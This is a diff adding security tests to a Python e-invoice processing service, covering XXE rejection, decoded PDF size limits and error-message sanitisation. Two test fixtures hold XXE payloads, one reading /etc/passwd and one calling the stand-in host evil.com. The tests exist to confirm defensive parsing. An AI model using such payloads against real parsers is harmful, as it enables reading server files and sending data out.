@@ -1,11 +1,15 @@
 """Tests for security hardening: size limits, XXE protection, input validation."""
 
+import base64
+
 import pytest
 from pydantic import ValidationError
 
-from einvoice_mcp.config import MAX_PDF_BASE64_SIZE, MAX_XML_SIZE
+from einvoice_mcp.config import MAX_PDF_BASE64_SIZE, MAX_PDF_DECODED_SIZE, MAX_XML_SIZE
+from einvoice_mcp.errors import InvoiceParsingError
 from einvoice_mcp.models import Address, InvoiceData, LineItem, Party
 from einvoice_mcp.services.kosit import KoSITClient
+from einvoice_mcp.services.xml_parser import parse_xml
 from einvoice_mcp.tools.compliance import check_compliance
 from einvoice_mcp.tools.parse import parse_einvoice
 from einvoice_mcp.tools.validate import validate_xrechnung, validate_zugferd
@@ -143,3 +147,84 @@ class TestModelFieldConstraints:
                 buyer=Party(name="B", address=Address(street="B", city="B", postal_code="00000")),
                 items=items,
             )
+
+
+class TestDefusedXMLPreScreen:
+    """Verify defusedxml pre-screens XML before drafthorse (lxml) parsing."""
+
+    def test_parse_xml_blocks_xxe(self) -> None:
+        xxe_xml = (
+            b'<?xml version="1.0"?>'
+            b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+            b"<rsm:CrossIndustryInvoice"
+            b' xmlns:rsm="urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100">'
+            b"&xxe;</rsm:CrossIndustryInvoice>"
+        )
+        with pytest.raises(InvoiceParsingError):
+            parse_xml(xxe_xml)
+
+    def test_parse_xml_blocks_external_entity(self) -> None:
+        # External general entity — defusedxml raises EntitiesForbidden
+        ext_xml = (
+            b'<?xml version="1.0"?>'
+            b"<!DOCTYPE foo ["
+            b'<!ENTITY ext SYSTEM "http://evil.com/secrets">'
+            b"]>"
+            b"<rsm:CrossIndustryInvoice"
+            b' xmlns:rsm="urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100">'
+            b"&ext;</rsm:CrossIndustryInvoice>"
+        )
+        with pytest.raises(InvoiceParsingError):
+            parse_xml(ext_xml)
+
+
+class TestDecodedPDFSizeLimit:
+    """Verify decoded PDF bytes are checked after base64 decoding."""
+
+    async def test_validate_rejects_oversized_decoded_pdf(self) -> None:
+        # Create base64 that decodes to > MAX_PDF_DECODED_SIZE
+        # but stays under MAX_PDF_BASE64_SIZE (using smaller payload)
+        raw_bytes = b"A" * (MAX_PDF_DECODED_SIZE + 1)
+        encoded = base64.b64encode(raw_bytes).decode()
+        client = KoSITClient(base_url=KOSIT_URL)
+        result = await validate_zugferd(encoded, client)
+        assert result["valid"] is False
+        assert any("Dekodierte PDF" in e["message"] for e in result["errors"])
+        await client.close()
+
+    async def test_parse_rejects_oversized_decoded_pdf(self) -> None:
+        raw_bytes = b"A" * (MAX_PDF_DECODED_SIZE + 1)
+        encoded = base64.b64encode(raw_bytes).decode()
+        result = await parse_einvoice(encoded, "pdf")
+        assert result["success"] is False
+        assert "Dekodierte PDF" in result["error"]
+
+
+class TestErrorSanitization:
+    """Verify that internal error details do not leak to user-facing messages."""
+
+    def test_connection_error_no_hostname_in_message_de(self) -> None:
+        from einvoice_mcp.errors import KoSITConnectionError
+
+        err = KoSITConnectionError("Connect call failed ('192.168.1.10', 8081)")
+        assert "192.168.1.10" not in err.message_de
+        assert "erreichbar" in err.message_de
+
+    def test_parsing_error_no_path_in_message_de(self) -> None:
+        err = InvoiceParsingError("/usr/local/lib/python3.11/xml/error.py")
+        assert "/usr/local" not in err.message_de
+        assert "gelesen werden" in err.message_de
+
+    def test_kosit_validation_error_allows_controlled_german_messages(self) -> None:
+        from einvoice_mcp.errors import KoSITValidationError
+
+        # Controlled German message (e.g. HTTP status info) should pass through
+        err = KoSITValidationError("Konfigurationsfehler im Validator (HTTP 422).")
+        assert "Konfigurationsfehler" in err.message_de
+
+    def test_kosit_validation_error_blocks_raw_httpx_errors(self) -> None:
+        from einvoice_mcp.errors import KoSITValidationError
+
+        err = KoSITValidationError("httpx.ReadTimeout: timed out after 30.0 seconds")
+        assert "httpx" not in err.message_de
+        assert "fehlgeschlagen" in err.message_de
